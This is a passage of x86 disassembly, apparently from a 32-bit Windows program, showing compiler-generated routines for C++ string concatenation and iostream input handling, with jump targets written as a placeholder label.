call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_410360
push 0xffffffff
push sub_4308e3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_4103e0
push 0xffffffff
push sub_430913
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
push 0x1
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_410460
push 0xffffffff
push sub_430943
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_4104e0
push 0xffffffff
push sub_430973
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_410560
push 0xffffffff
push sub_4309a3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_4105e0
push 0xffffffff
push sub_4309d3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
push 0x1
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_410660
push 0xffffffff
push sub_430a03
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_4106e0
push 0xffffffff
push sub_430a18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Unlock@IAT ]
sub_410740
push 0xffffffff
push sub_430a38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Unlock@IAT ]
sub_4107a0
push 0xffffffff
push sub_430a58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov [ esp + 0x4 ] esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x1c ]
mov ecx [ esi ]
push eax
call [ std::basic_istream<char,struct std::char_traits<char> >::_Ipfx@IAT ]
mov [ esi + 0x4 ] al
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Lock@IAT ]
sub_410820
push 0xffffffff
push sub_430a78
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov [ esp + 0x4 ] esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x1c ]
mov ecx [ esi ]
push eax
call [ std::basic_istream<wchar_t,struct std::char_traits<wchar_t> >::_Ipfx@IAT ]
mov [ esi + 0x4 ] al
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Lock@IAT ]
sub_4108a0
push 0xffffffff
push sub_430a98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi ecx
mov [ edi ] esi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
mov [ esp + 0x8 ] edi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x0
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::good@IAT ]
test al al
je r-xdata
mov eax [ edi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Lock@IAT ]
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::good@IAT ]
mov [ edi + 0x4 ] al
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::tie@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::tie@IAT ]
mov ecx eax
call [ std::basic_ostream<char,struct std::char_traits<char> >::flush@IAT ]
sub_410960
push 0xffffffff
push sub_430ab8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
call [ std::uncaught_exception@IAT ]
test al al
jne r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::_Osfx@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Unlock@IAT ]
sub_4109e0
push 0xffffffff
push sub_430ad8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi ecx
mov [ edi ] esi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
mov [ esp + 0x8 ] edi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x0
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::good@IAT ]
test al al
je r-xdata
mov eax [ edi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Lock@IAT ]
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::good@IAT ]
mov [ edi + 0x4 ] al
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::tie@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::tie@IAT ]
mov ecx eax
call [ std::basic_ostream<wchar_t,struct std::char_traits<wchar_t> >::flush@IAT ]
sub_410aa0
push 0xffffffff
push sub_430af8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
call [ std::uncaught_exception@IAT ]
test al al
jne r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
call [ std::basic_ostream<wchar_t,struct std::char_traits<wchar_t> >::_Osfx@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Unlock@IAT ]
sub_410b20
push ebp
mov ebp esp
push 0xffffffff
push sub_430b29
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x11 ] 0x0
push edi
mov esi [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x34 ]
call sub_4107a0
mov [ ebp - 0x4 ] edi
mov al [ ebp - 0x30 ]
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x0
push 0x0
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
mov al [ ebp - 0x11 ]
test al al
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::ios_base::getloc@IAT ]
mov [ ebp - 0x4 ] 0x1
push eax
call sub_410140
add esp 0x4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x20 ]
call [ std::locale::~locale@IAT ]
mov edx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov eax [ edx ]
push eax
push edi
mov ebx [ ebp + 0xc ]
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::erase@IAT ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
test eax eax
jle r-xdata
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x18 ] 0x2
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::max_size@IAT ]
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
mov edi eax
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::max_size@IAT ]
cmp edi eax
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Unlock@IAT ]
call [ std::char_traits<char>::eof@IAT ]
mov [ ebp - 0x24 ] eax
lea edx [ ebp - 0x1c ]
push edx
lea eax [ ebp - 0x24 ]
push eax
call [ std::char_traits<char>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
call [ std::char_traits<char>::to_char_type@IAT ]
add esp 0x4
push eax
push 0x48
mov ecx [ ebp - 0x28 ]
call [ std::ctype<char>::is@IAT ]
test al al
jne r-xdata
or [ ebp - 0x18 ] 0x1
jmp r-xdata
mov edi eax
mov [ ebp - 0x2c ] edi
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::sgetc@IAT ]
lea edx [ ebp - 0x1c ]
push edx
call [ std::char_traits<char>::to_char_type@IAT ]
add esp 0x4
push eax
push 0x1
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ ebp - 0x11 ] 0x1
dec edi
mov [ ebp - 0x2c ] edi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::snextc@IAT ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
test edi edi
jbe r-xdata
sub_410ca9
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
push 0x0
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
mov al [ ebp - 0x11 ]
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x18 ] 0x2
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Unlock@IAT ]
sub_410d30
push ebp
mov ebp esp
push 0xffffffff
push sub_430b50
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x11 ] 0x0
mov ebx 0x1
push ebx
mov esi [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x2c ]
call sub_4107a0
mov [ ebp - 0x4 ] edi
mov al [ ebp - 0x28 ]
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov al [ ebp - 0x11 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] bl
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx [ eax ]
push ecx
push edi
mov edi [ ebp + 0xc ]
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::erase@IAT ]
lea edx [ ebp + 0x10 ]
push edx
call [ std::char_traits<char>::to_int_type@IAT ]
add esp 0x4
mov [ ebp - 0x24 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::sgetc@IAT ]
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x18 ] 0x2
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
call [ std::char_traits<char>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
or [ ebp - 0x18 ] ebx
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::_Unlock@IAT ]
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
mov ebx eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::max_size@IAT ]
cmp eax ebx
ja r-xdata
mov [ ebp - 0x11 ] bl
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::sbumpc@IAT ]
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ std::char_traits<char>::to_char_type@IAT ]
add esp 0x4
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov ebx 0x1
mov [ ebp - 0x11 ] bl
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::snextc@IAT ]
jmp r-xdata
or [ ebp - 0x18 ] 0x2
jmp r-xdata
mov [ ebp - 0x1c ] eax
call [ std::char_traits<char>::eof@IAT ]
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
call [ std::char_traits<char>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
sub_410ef0
push ebp
mov ebp esp
push 0xffffffff
push sub_430b68
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
mov edi eax
mov [ ebp - 0x20 ] edi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
test eax eax
jle r-xdata
push esi
lea ecx [ ebp - 0x40 ]
call sub_4108a0
xor edi edi
mov [ ebp - 0x4 ] edi
mov al [ ebp - 0x3c ]
test al al
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::ios_base::flags@IAT ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
mov ebx eax
sub ebx edi
mov [ ebp - 0x2c ] edi
cmp edi [ ebp - 0x20 ]
jae r-xdata
cmp ebx edi
jbe r-xdata
mov [ ebp - 0x4 ] 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
